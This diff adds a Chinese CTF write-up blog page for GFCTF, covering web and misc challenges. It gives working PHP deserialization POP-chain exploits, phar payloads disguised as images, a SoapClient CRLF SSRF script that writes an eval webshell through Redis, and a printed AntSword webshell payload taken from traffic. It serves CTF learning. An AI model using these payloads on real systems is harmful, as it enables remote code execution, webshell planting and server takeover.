@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>GFCTF wp | Artone &#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://boooook123.github.io/Artone.github.io//favicon.ico?v=1668409090686">
+<link rel="stylesheet" href="https://boooook123.github.io/Artone.github.io//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="经典打卡安恒十月月赛，但是这个wp拖更整整一个月了。。😅
+
+web
+EasyPOP
+先看源码
+ &lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+class fine
+{
+  ..." />
+    <meta name="keywords" content="蚁剑,pop链,wakeup,CRLF,Radis,RCE,原生类,xxd命令,MySQL的原始数据文件,MISC,流量取证,CTF,WEB" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://boooook123.github.io/Artone.github.io/">
+        <img src="https://boooook123.github.io/Artone.github.io//images/avatar.png?v=1668409090686" class="site-logo">
+        <h1 class="site-title">Artone &#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      一些细细的琐事。。
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://boooook123.github.io/Artone.github.io//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">GFCTF wp</h2>
+            <div class="post-date">2022-11-08</div>
+            
+            <div class="post-content" v-pre>
+              <p>经典打卡安恒十月月赛，但是这个wp拖更整整一个月了。。😅</p>
+<!-- more -->
+<h1 id="web">web</h1>
+<h2 id="easypop">EasyPOP</h2>
+<p>先看源码</p>
+<pre><code class="language-php"> &lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+class fine
+{
+    private $cmd;
+    private $content;
+
+    public function __construct($cmd, $content)
+    {
+        $this-&gt;cmd = $cmd;
+        $this-&gt;content = $content;
+    }
+
+    public function __invoke()
+    {
+        echo &quot;123&quot;;
+        call_user_func($this-&gt;cmd, $this-&gt;content);
+    }
+
+    public function __wakeup()
+    {
+        $this-&gt;cmd = &quot;&quot;;
+        die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);
+    }
+}
+
+class show
+{
+    public $ctf;
+    public $time = &quot;Two and a half years&quot;;
+
+    public function __construct($ctf)
+    {
+        $this-&gt;ctf = $ctf;
+    }
+
+
+    public function __toString()
+    {
+        return $this-&gt;ctf-&gt;show();
+    }
+
+    public function show(): string
+    {
+        return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;
+    }
+
+
+}
+
+class sorry
+{
+    private $name;
+    private $password;
+    public $hint = &quot;hint is depend on you&quot;;
+    public $key;
+
+    public function __construct($name, $password)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;password = $password;
+    }
+
+    public function __sleep()
+    {
+        $this-&gt;hint = new secret_code();
+    }
+
+    public function __get($name)
+    {
+        $name = $this-&gt;key;
+        $name();
+    }
+
+
+    public function __destruct()
+    {
+        if ($this-&gt;password == $this-&gt;name) {
+
+            echo $this-&gt;hint;
+        } else if ($this-&gt;name = &quot;jay&quot;) {
+            secret_code::secret();
+        } else {
+            echo &quot;This is our code&quot;;
+        }
+    }
+
+
+    public function getPassword()
+    {
+        return $this-&gt;password;
+    }
+
+    public function setPassword($password): void
+    {
+        $this-&gt;password = $password;
+    }
+
+
+}
+
+class secret_code
+{
+    protected $code;
+
+    public static function secret()
+    {
+        include_once &quot;hint.php&quot;;
+        hint();
+    }
+
+    public function __call($name, $arguments)
+    {
+        $num = $name;
+        $this-&gt;$num();
+    }
+
+    private function show()
+    {
+        return $this-&gt;code-&gt;secret;
+    }
+}
+
+
+if (isset($_GET['pop'])) {
+    $a = unserialize($_GET['pop']);
+    $a-&gt;setPassword(md5(mt_rand()));
+} else {
+    $a = new show(&quot;Ctfer&quot;);
+    echo $a-&gt;show();
+}
+Go listen to Jay Chou's secret-code! Really nice123
+</code></pre>
+<p>pop链：</p>
+<pre><code>sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
+</code></pre>
+<p>这里想要调用destruct中的hint就需要满足</p>
+<pre><code>($this-&gt;password == $this-&gt;name)
+</code></pre>
+<p>这里他设置了Password，但是是在反序列化之后，所以并没有什么作用，直接传两个值使之相等即可</p>
+<p>exp：</p>
+<pre><code class="language-php">&lt;?php
+
+class sorry
+{
+    private $name;
+    private $password;
+    public $hint;
+    public $key;
+    public function __construct($name,$password,$hint,$key)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;password = $password;
+        $this-&gt;hint = $hint;
+        $this-&gt;key = $key;
+    }
+
+}
+class show
+{
+    public $ctf;
+    public function __construct($ctf)
+    {
+        $this-&gt;ctf = $ctf;
+    }
+}
+class secret_code
+{
+    protected $code;
+    public function __construct($code)
+    {
+        $this-&gt;code = $code;
+    }
+}
+class fine
+{
+    private $cmd;
+    private $content;
+    public function __construct($cmd, $content)
+    {
+        $this-&gt;cmd = $cmd;
+        $this-&gt;content = $content;
+    }
+
+}
+$f = new fine(&quot;system&quot;, &quot;cat /*&quot;);
+$s1 = new sorry('','','',$f);
+$s = new secret_code($s1);
+$sh = new show($s);
+$a = new sorry(&quot;jay&quot;, &quot;jay&quot;, $sh ,'');
+
+$b = serialize($a);
+$b1 = str_replace('&quot;fine&quot;:2', '&quot;fine&quot;:3', $b);
+echo urlencode($b1);
+# sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
+</code></pre>
+<h2 id="hade_waibo">hade_waibo</h2>
+<h3 id="非预期">非预期</h3>
+<p>没有删start.sh,</p>
+<p>任意文件读直接读到start.sh,找到flag的文件名</p>
+<h3 id="预期解">预期解</h3>
+<p>先登入，不设有密码，随便输一个username就可以登入了</p>
+<p>在里面发现一个文件上传点，以及一个文件读取点，没有任何过滤，也就是说可以任意文件读</p>
+<p>可以先把相关的源码都读出来</p>
+<p>重点在class.php</p>
+<pre><code class="language-php">&lt;?php
+class User
+{
+    public $username;
+    public function __construct($username){  //由前端的输入触发
+        $this-&gt;username = $username;
+        $_SESSION['isLogin'] = True;
+        $_SESSION['username'] = $username;
+    }
+    public function __wakeup(){
+        $cklen = strlen($_SESSION[&quot;username&quot;]);
+        if ($cklen != 0 and $cklen &lt;= 6) {
+            $this-&gt;username = $_SESSION[&quot;username&quot;];
+        }
+    }
+    public function __destruct(){
+        if ($this-&gt;username == '') {  //触发toString
+            session_destroy();  //销毁当前会话中的数据
+        }
+    }
+}
+
+class File
+{
+    #更新黑名单为白名单，更加的安全
+    public $white = array(&quot;jpg&quot;,&quot;png&quot;);
+
+    public function show($filename){  //前端可触发
+        echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\'file.php?m=show&amp;filename=\'+document.getElementById(\'filename\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;';
+        if(empty($filename)){die();}
+        return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;';  //可以触发反序列化
+    }
+    public function upload($type){  //前端可触发
+        $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename);
+        return &quot;Upload success! Path: upload/&quot; . $filename;
+    }
+    public function rmfile(){
+        system('rm -rf /var/www/html/upload/*');
+    }
+    public function check($type){
+        if (!in_array($type,$this-&gt;white)){
+            return false;
+        }
+        return true;
+    }
+
+}
+
+#更新了一个恶意又有趣的Test类
+class Test
+{
+    public $value;
+
+    public function __destruct(){
+        chdir('./upload');
+        $this-&gt;backdoor();
+    }
+    public function __wakeup(){
+        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
+    }
+    public function __toString(){
+        $file = substr($_GET['file'],0,3);
+        file_put_contents($file, &quot;Hack by $file !&quot;);
+        return 'Unreachable! :)';
+    }
+    public function backdoor(){
+        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
+            $this-&gt;value = 'nono~';
+        }
+        system($this-&gt;value);
+    }
+
+}
+</code></pre>
+<p>file类中使用file_get_contents函数，从而提供了打phar反序列化的可能，又一个system可以命令执行，但是做了无数字和无字母的过滤，难以直接利用</p>
+<p>这里可以分两步来利用system执行命令</p>
+<h4 id="第一步">第一步</h4>
+<p>构造链子触发toString，来写文件，这里我们可控的只有文件名，不过这已经够了，因为通配符可以匹配文件名，所以只要把文件名设为cat，我们就可以用通配符*在命令执行中代替cat，从而绕过preg_match</p>
+<p>链子：</p>
+<pre><code>User::destruct -&gt; Test::toString
+</code></pre>
+<p>为了形成这个链子，我们需要让username=new Test() ，但是__wakeup()会先于__destruct()触发，覆盖掉username的值</p>
+<pre><code class="language-php">public function __wakeup(){
+        $cklen = strlen($_SESSION[&quot;username&quot;]);
+        if ($cklen != 0 and $cklen &lt;= 6) {
+            $this-&gt;username = $_SESSION[&quot;username&quot;];
+        }
+    }
+    public function __destruct(){
+        if ($this-&gt;username == '') {  //触发toString
+            session_destroy();  //销毁当前会话中的数据
+        }
+    }
+</code></pre>
+<p>由于版本的原因，这样的wakeup不能有之前的cve来绕过，所以我们只能使它不满足if，也就是让SESSION[&quot;username&quot;]的长度大于6，在最开始的登入界面，前端限制了username的长度，但是可以通过bp等手段去绕过</p>
+<p>exp：</p>
+<pre><code class="language-php">&lt;?php
+class User
+{
+    public $username;
+    function __construct($username)
+    {
+        $this-&gt;username = $username;
+    }
+}
+class Test
+{
+    public $value;
+    function __construct($value)
+    {
+        $this-&gt;value = $value;
+    }
+    
+}
+@unlink(&quot;phar.phar&quot;);
+@unlink(&quot;phar.jpg&quot;);
+$Test = new Test(&quot;aa&quot;);
+$User = new User($Test);
+
+echo serialize($User);
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt; addFromString('test.txt','h3en1');
+$phar-&gt;setMetadata($User);
+$phar-&gt;stopBuffering();
+rename(&quot;phar.phar&quot;,&quot;phar.jpg&quot;);
+</code></pre>
+<p>upload后，触发phar反序列化</p>
+<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfb886ff1ed98265e607978e50ce7e72f4.jpg/test.txt&amp;file=cat HTTP/1.1
+</code></pre>
+<p>生成后可以再读一下cat文件，确保已经生成</p>
+<h4 id="第二步">第二步</h4>
+<p>利用通配符读出所有文件，system里应该执行的是* /*</p>
+<p>但是我们可以看到在backdoor执行之前，会触发wakeup，也就是覆盖掉value的值，而且这里并不像User里的wakeup绕过</p>
+<pre><code class="language-php">public function __wakeup(){
+        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
+    }
+    public function __toString(){
+        $file = substr($_GET['file'],0,3);
+        file_put_contents($file, &quot;Hack by $file !&quot;);
+        return 'Unreachable! :)';
+    }
+    public function backdoor(){
+        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
+            $this-&gt;value = 'nono~';
+        }
+        system($this-&gt;value);
+    }
+</code></pre>
+<p>这里我们只能考虑如何在value被覆盖后再改回来，这里就涉及到了反序列化的执行顺序</p>
+<p>如果我的链子是从User打到Test，那么他会先反序列化Test，然后反序列化User，这里我们可以调试一下看看他是怎么反序列化的</p>
+<pre><code class="language-php">&lt;?php
+class User
+{
+    public $username;
+    public $a;
+    public function __construct($a)
+    {
+        $this-&gt;a = $a;
+    }
+    public function __wakeup()
+    {
+        echo &quot;2&quot;;
+    }
+}
+class Test
+{
+    public $value;
+    function __construct($value)
+    {
+        $this-&gt;value = $value;
+    }
+    public function __wakeup()
+    {
+        echo &quot;1&quot;;
+    }
+}
+$Test = new Test(&quot;aa&quot;);
+$User = new User($Test); 
+$User-&gt;username = &amp;$Test-&gt;value;
+$ss = serialize($User);
+unserialize($ss);
+
+#12
+</code></pre>
+<p>所以我们可以通过User里的wakeup重新给username赋回我们想要的值</p>
+<p>想要通过username给value赋值细分来说也需要两步</p>
+<h5 id="第一步-2">第一步</h5>
+<p>注册一个username 为* /*，初始化后会把这个值放在SESSION[&quot;username&quot;]，之后还会赋值给username</p>
+<pre><code class="language-php">public function __wakeup(){
+        $cklen = strlen($_SESSION[&quot;username&quot;]);
+        if ($cklen != 0 and $cklen &lt;= 6) {
+            $this-&gt;username = $_SESSION[&quot;username&quot;];
+        }
+    }
+</code></pre>
+<h5 id="第二步-2">第二步</h5>
+<p>在构造链子的时候使username=&amp;Test-&gt;value，也就是让username变成指向value的指针</p>
+<h4 id="final-exp">Final exp：</h4>
+<pre><code class="language-php">&lt;?php
+class User
+{
+    public $username;
+}
+class Test
+{
+    public $value;
+}
+@unlink(&quot;phar1.phar&quot;);
+@unlink(&quot;phar1.jpg&quot;);
+$User = new User();
+$Test = new Test();
+$User-&gt;a = $Test;  //这里只要链上就行
+$User-&gt;username = &amp;$Test-&gt;value;
+echo serialize($User);
+$phar = new Phar(&quot;phar1.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt; addFromString('test.txt','h3en1');
+$phar-&gt;setMetadata($User);
+$phar-&gt;stopBuffering();
+rename(&quot;phar1.phar&quot;,&quot;phar1.jpg&quot;);
+</code></pre>
+<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfafee6033fe501630864dcaf25a98d1ee.jpg/test.txt
+</code></pre>
+<h2 id="easylove">EasyLove</h2>
+<p>php源码</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class swpu{
+    public $wllm;
+    public $arsenetang;
+    public $l61q4cheng;
+    public $love;
+    
+    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
+        $this-&gt;wllm = $wllm;
+        $this-&gt;arsenetang = $arsenetang;
+        $this-&gt;l61q4cheng = $l61q4cheng;
+        $this-&gt;love = $love;
+    }
+    public function newnewnew(){
+        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
+    }
+
+    public function flag(){
+        $this-&gt;love-&gt;getflag();
+    }
+    
+    public function __destruct(){
+        $this-&gt;newnewnew();
+        $this-&gt;flag();
+    }
+}
+class hint{
+    public $hint;
+    public function __destruct(){
+        echo file_get_contents($this-&gt; hint.'hint.php');
+    }
+}
+$hello = $_GET['hello'];
+$world = unserialize($hello);  
+</code></pre>
+<p>首先打一个反序列化拿一下hint</p>
+<pre><code class="language-php">&lt;?php
+class hint{
+	public $hint;
+	public function __construct($hint){
+		$this-&gt;hint = $hint;
+	}
+}
+$h = new hint(&quot;php://filter/read=convert.base64-encode/resource=&quot;);
+echo serialize($h);
+echo urlencode(serialize($h));
+</code></pre>
+<p>得到hint</p>
+<pre><code class="language-php">&lt;?php
+	$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;
+?&gt;
+</code></pre>
+<p>后端有Redis数据库，并且告诉了我们密码</p>
+<p>可以看到在</p>
+<pre><code>public function newnewnew(){
+        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
+    }
+</code></pre>
+<p>我们可以构造一个任意类，那么可以尝试调用原生类<strong>SoapClient</strong>，造成SSRF，来打Redis</p>
+<p>低版本的Redis会将请求头的内容作为redis命令解析，那么只要我们通过CRLF控制住请求头，再配合SoapClient发起请求即可</p>
+<p>exp：</p>
+<pre><code class="language-php">&lt;?php
+$target='http://127.0.0.1:6379/';  //Redis的默认端口
+$poc0=&quot;AUTH 20220311&quot;;  //登入
+$poc=&quot;CONFIG SET dir /var/www/html&quot;;  //在无需重启Redis的情况下设置工作目录
+//写文件
+$poc1=&quot;SET x '&lt;?@eval(\$_POST[1]);?&gt;'&quot;;  //设置一个键来保存字符串
+$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;
+$poc3=&quot;SAVE&quot;;
+$a = array('location' =&gt; $target,'uri' =&gt; 'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');
+$aaa = serialize($a);
+$aaa = str_replace('^^',&quot;\r\n&quot;,$aaa);
+$c=unserialize($aaa);
+class swpu{
+    public $wllm = 'SoapClient';
+    public $arsenetang = null;
+    public $l61q4cheng;
+    public $love;
+}
+$a=new swpu();
+$a-&gt;l61q4cheng=$c;
+echo urlencode(serialize($a));
+?&gt;
+</code></pre>
+<p>挂上马后再用蚁剑连接，最后suid提权</p>
+<h3 id="关于crlf">关于CRLF</h3>
+<p>https://www.php.cn/php-weizijiaocheng-491990.html</p>
+<pre><code>&lt;?php
+$a = new SoapClient(null, arry(
+'location' =&gt; 'http://127.0.0.1:6379',
+'uri' =&gt; 'uri',
+'user_agent' =&gt; &quot;111111\r\nCookie: PHPSESSION=321321313&quot;
+));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;a();
+</code></pre>
+<p>可以在uri或者user_agent等字段中，通过\r\n来插入多个请求头，形成CRLF注入</p>
+<p>关于Redis命令</p>
+<p>https://redis.io/commands/</p>
+<h1 id="misc">misc</h1>
+<h2 id="滴滴图">滴滴图</h2>
+<p>附件是一张图片，以及一个 zip文件，显然是图片隐藏了密码</p>
+<p>用winhex打开，可以在最下面看到一个密码this_is_paSS</p>
+<p>用binwalk分离一下图片，发现有两个压缩包，用这个密码可以解开</p>
+<p>里面是两张一样的图片，发现CRC校验有问题，修改了一下宽高，得到另一个密码</p>
+<p>解压最开始的压缩包可以得到音频文件，发现是一段摩斯密码</p>
+<p>解出flag</p>
+<h2 id="ez_xxd">ez_xxd</h2>
+<p>首先是一个流量包，先过滤出http流量，发现有一个flag.txt和maybe_today.zip</p>
+<p>这里可以在响应头找到数据块，导出分组字节流，于是就得到了这两个文件</p>
+<p>zip设置了密码，于是考虑在flag.txt上找线索，flag.txt中的内容显然是base64，但是解出来的东西并没有明显的端倪</p>
+<p>于是，看一下flag.txt的来源</p>
+<p>回到流量包，追踪一下shell.php,发现是一个蚁剑流量，先base64解码</p>
+<pre><code class="language-php">g0f49a7f453a2e=wdY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3h4ZCAtcyAweDA4IC1wIC93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QvTWlrdS5wbmd8YmFzZTY0PmZsYWcudHh0O2VjaG8gMzFhODM7cHdkO2VjaG8gMjk5ZWNkNWNkYg==&amp;s2f57bf194897a=zdL2Jpbi9zaA==&amp;shell=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) {$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.&quot;/.722722&quot;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++){@chdir(&quot;..&quot;);};@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;6d&quot;.&quot;fcb&quot;;echo @asenc($output);echo &quot;8c2&quot;.&quot;fa8&quot;;}ob_start();try{$p=base64_decode(substr($_POST[&quot;s2f57bf194897a&quot;],2));$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;v09c646ce6cb4a&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;){@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);}else{@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);}if(!empty($envstr)){$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));}}}$r=&quot;{$p} {$c}&quot;;function fe($f){$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv(&quot;PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe('error_log')) {error_log(&quot;a&quot;, 1);} else {mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join(&quot;
+&quot;,$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)){$w=new COM('WScript.shell');$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();&amp;v09c646ce6cb4a=LI
+</code></pre>
+<p>第一个参数g0f49a7f453a2e,追踪一下</p>
+<pre><code>$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2))
+</code></pre>
+<p>可以看到对这个传参的处理，是去掉了前两位然后再base64解码</p>
+<p>所以安装这种方式进行解码</p>
+<pre><code>cd &quot;/www/admin/localhost_80/wwwroot&quot;;xxd -s 0x08 -p /www/admin/localhost_80/wwwroot/Miku.png|base64&gt;flag.txt;echo 31a83;pwd;echo 299ecd5cdb
+</code></pre>
+<p>xxd命令将png的十六进制从0X08偏移开始base64加密，也就是去掉前前面8个字节，或者说就是去掉了png的文件头</p>
+<p>所以，我们可以base64解码后再手动加上文件头</p>
+<p>或者写一个脚本：</p>
+<pre><code class="language-python">import base64
+f = open(&quot;flag.txt&quot;, 'r')
+png = open('flag1.txt', 'ab+')
+new = open('new.png', 'wb+')
+png.write(b'89504e470d0a1a0a')
+for line in f.readlines():
+    png.write(base64.b64decode(line).replace(b'\n', b''))
+png.close()
+flag = open('flag.txt', 'r')
+new.write(bytes.fromhex(flag.read()))
+f.close()
+flag.close()
+new.close()
+</code></pre>
+<p>最终得到Miku.png这张图片，不难发现这个图片和之前压缩包里的图片大小一样，CRC一样，也就是说可以进行明文爆破</p>
+<p>爆破后，得到的是一个前端小游戏，在SceneManager.js中找到一个key</p>
+<p>sWxSAnweQIES46L</p>
+<p>然后还有数据库的原始文件，可以放到mysql的data路径下，然后起mysql服务，用navicat连上就能看到一段base64，解码后是一个pk文件头，直接保存zip文件</p>
+<p>用刚刚的key解压，得到另一端密文</p>
+<pre><code>~呜嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~~~嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷嗷呜嗷呜呜啊~啊~啊嗷啊呜嗷嗷~啊~嗷~呜呜呜啊呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~啊啊嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊啊啊~啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊呜啊呜啊嗷啊呜~啊呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜~~嗷呜嗷呜呜~呜嗷呜啊嗷啊呜~啊啊嗷~嗷~呜呜呜呜啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊~啊~啊嗷啊呜~~嗷呜~嗷~呜呜嗷~嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜嗷嗷呜啊~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜~~呜呜嗷呜呜~嗷嗷呜啊嗷啊呜嗷嗷~啊~嗷~呜嗷呜嗷嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊~~啊啊嗷啊呜~~呜嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~呜嗷呜啊嗷啊呜~~呜嗷~嗷~呜呜呜呜~嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷呜嗷啊嗷啊呜~~嗷嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜啊嗷呜呜嗷呜呜啊啊啊~啊嗷啊呜~~嗷呜~嗷~呜呜嗷~嗷嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷呜嗷啊嗷啊呜~啊啊嗷~嗷~呜呜呜啊呜嗷嗷嗷呜呜啊嗷嗷呜嗷呜呜啊啊啊~啊嗷啊呜嗷嗷~啊~嗷~呜嗷呜嗷呜嗷嗷嗷呜呜啊嗷呜呜嗷呜呜~嗷嗷呜啊嗷啊呜~~嗷嗷~嗷~呜嗷呜嗷啊嗷嗷嗷呜呜~~呜呜嗷呜呜啊啊啊嗷啊嗷啊呜~呜啊嗷~嗷~呜嗷呜~嗷啊
+</code></pre>
+<p>兽音译者解码得到flag</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/PO1RTv5lx/" class="tag">
+                    蚁剑
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/fainYXnfrf/" class="tag">
+                    pop链
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/Rv6ujo8s3h/" class="tag">
+                    wakeup
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/gSc9IwyUiK/" class="tag">
+                    CRLF
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/6HVQ3mmiJh/" class="tag">
+                    Radis
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/w1u4sc9nry/" class="tag">
+                    RCE
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/S0FFdY1zq2/" class="tag">
+                    原生类
+                  </a>
+                
